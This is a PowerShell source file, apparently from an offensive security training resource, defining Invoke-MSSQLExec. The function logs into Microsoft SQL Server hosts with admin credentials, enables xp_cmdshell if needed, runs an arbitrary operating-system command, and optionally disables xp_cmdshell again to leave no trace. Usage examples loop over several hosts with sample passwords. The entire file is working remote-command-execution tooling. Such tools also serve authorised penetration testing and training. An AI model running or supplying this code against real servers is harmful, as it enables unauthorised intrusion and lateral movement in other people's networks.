Function Invoke-MSSQLExec {

    <#
.SYNOPSIS
    Utilizes xp_cmdshell on Microsoft SQL Server to execute command in OS
.DESCRIPTION
    Microsoft SQL Server has xp_cmdshell procedure which executes any command in 
    operating system. This function tries to laverage that functionality. 
.PARAMETER Hosts
    Hosts to exec. Default port for MSSQL is 1433, if you have a host on another one 
    enter it using comma (not colon), for example: 172.16.100.10,1432
.PARAMETER User
    Username (should be sa or other with admin privileges)
.PARAMETER Password
    Password for superadmin
.INPUTS
    Hosts array
.OUTPUTS
    Array of objects with proporties: Host, Command, Output
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLExec -host "172.16.0.100" -User  sa -p 'P@ssw0rd' -Command "whoami" -verbose
.EXAMPLE
    $targets =
        @{Host="172.16.0.101";User="sa";Password="Zima2019!"},
        @{Host="172.16.0.102";User="sa";Password="P@ssw0rd"}

    $targets | % {
        Invoke-MSSQLExec -Host $_.Host -User $_.User -Password $_.Password -Command "whoami" -Verbose|format-list
    }
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [String[]]$Hosts,
        [Parameter(Position = 1)]
        [String]$User = "sa",
        [Parameter(Position = 2)]
        [String]$Password = (""),
        [Parameter(Position = 3)]
        [String]$Command = (""),
        [Parameter(Position = 4)]
        [ValidateSet('No','IfNeeded')]
        [String]$EnableXpCmdShell = ("IfNeeded"),
        [Parameter(Position = 5)]
        [ValidateSet('Yes','IfModified', 'No')]
        [String]$DisableXpCmdShell = ("IfModified")

    )

    Begin {
        $Result = @()
        $XPCmdShellModified = $false
        $enable_xp_cmdshell_query = @'
exec sp_configure 'show advanced options', 1 
RECONFIGURE 
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
'@
        $disable_xp_cmdshell_query = @'
exec sp_configure 'show advanced options', 1 
RECONFIGURE 
EXEC sp_configure 'xp_cmdshell', 0;  
RECONFIGURE;  
'@

        $check_xp_cmdshell_query = @'
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured 
FROM sys.configurations 
WHERE name = 'xp_cmdshell';
'@

        function query($conn, $sql) {
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $sql
            $result = $cmd.ExecuteReader()
            $table = new-object "System.Data.DataTable"
            $table.Load($result)
            return $table
        }
        function xp_cmdshell_enable($conn) {
            query $conn $enable_xp_cmdshell_query
        }
        function xp_cmdshell_disable($conn) {
            query $conn $disable_xp_cmdshell_query
        }
        function xp_cmdshell_check($conn) {
            $t = query $conn $check_xp_cmdshell_query
            return $t.IsConfigured
        }
    }

    Process {
        ForEach ($_host in $Hosts) {
            Write-Verbose "[*] Trying host $_host"
            $Connection = New-Object System.Data.SQLClient.SQLConnection
            $Connection.ConnectionString = "Data Source=$_host;Persist Security Info=True;User ID=$User;Password=$Password"
            try {
                $Connection.Open()
                Write-Verbose "[*] Connected to $_host"
                try {
                    if ($EnableXpCmdShell -eq "IfNeeded") {
                        Write-Verbose "[*] Checking whether xp_cmdshell is enabled"
                        $enabled = xp_cmdshell_check $Connection
                        Write-Verbose "[*] xp_cmdshell enabled: $enabled"
                        if ($enabled -eq 0) {
                            Write-Verbose "[*] Enabling xp_cmdshell"
                            xp_cmdshell_enable $Connection
                            $XPCmdShellModified = $true
                        }
                    }

                    Write-Verbose "[*] Trying to execute xp_cmdshell '$Command'"
                    try {
                        $output = query $Connection "exec xp_cmdshell '$Command'"

                        $o = New-Object -TypeName psobject 
                        $o | Add-Member -MemberType NoteProperty -Name Host -Value $_host
                        $o | Add-Member -MemberType NoteProperty -Name Command -Value $Command
                        $o | Add-Member -MemberType NoteProperty -Name Output -Value ($output.output -join "`n")
                        $Result += $o
                    } catch [Exception] {
                        Write-Error "Whoops"
                        Write-Host $_.Exception.Message
                    }

                    if ($DisableXpCmdShell -eq "Yes" -or ($XPCmdShellModified -eq $true -and $DisableXpCmdShell -eq "IfModified")) {
                        Write-Verbose "[*] Disabling xp_cmdshell"
                        xp_cmdshell_disable $Connection
                    }
                }
                catch [Exception] {
                    Write-Error "Whoops"
                    Write-Host $_.Exception.Message
                }
            }
            catch [Exception] {
                Write-Verbose "[*] Can't connect to $_host ($($User):$($Password))"
            }
        }
    }

    End {
        $Result
    }

}